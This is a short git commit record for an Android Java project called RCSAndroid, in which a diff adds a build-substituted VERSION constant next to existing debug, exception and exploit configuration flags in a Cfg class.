7a2eb8bbc6265a902ad746215ff6ee24c05be622
Fabrizio Cornelli <finance@suppose.it>
2012-06-13 09:20:27 +0200

    compilazione multicore, manca il dist

--- RCSAndroid/preprocess/Cfg.java
+++ RCSAndroid/preprocess/Cfg.java
@@ -2,6 +2,8 @@ package com.android.service.auto;
 
 public class Cfg {
 	//ATTENZIONE, NON CAMBIARE A MANO LA VARIABILE DEBUG, VIENE RISCRITTA DA ANT
+	public static final String VERSION = "@VERSION@";
+	
 	public static final boolean DEBUG = @DEBUG@;
 	public static final boolean EXCEPTION = @EXCEPTION@;
 	public static final boolean EXP = @EXPLOIT@;
